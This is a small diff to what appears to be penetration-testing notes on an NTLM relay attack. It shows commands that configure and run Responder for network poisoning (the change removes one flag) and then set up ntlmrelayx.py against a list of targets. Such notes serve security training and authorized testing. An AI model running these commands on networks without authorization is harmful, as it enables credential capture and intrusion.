@@ -63,7 +63,7 @@ Quick Information:
 	- Step1: Update the responder conf in the path /etc/responder/Responder.conf with the below command.
 		- `sudo mousepad /etc/responder/Responder.conf` and update the SMB and HTTP (Servers to start) to Off and save the file.
 	- Step2: Run the responder with the below syntax:
-		- `sudo responder -I eth0 -dwPv`
+		- `sudo responder -I eth0 -dPv`
 	- Step3: Setup your relay with the tool `ntlmrelayx.py`
 		- Syntax: `sudo ntlmrelayx.py -tf targets.txt -smb2support`
 			- -tf - target file
